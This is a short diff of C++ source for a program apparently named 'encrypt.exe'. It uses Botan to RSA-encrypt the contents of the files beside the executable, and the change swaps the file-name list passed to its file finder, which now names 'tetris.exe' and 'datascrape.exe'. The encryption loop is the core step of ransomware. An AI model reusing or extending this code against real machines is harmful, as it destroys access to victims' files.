@@ -167,7 +167,7 @@ int main()
 
     Botan::RSA_PublicKey pubKey(privKey);
 
-    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"cmake_install.cmake", "CMakeCache.txt", "encrypt.pdb", "Makefile", "rsa_key.pem"});
+    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeCache.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp"});
     for (const fs::path &file : files)
     {
         encryptFileContent(file.string(), pubKey, rng);
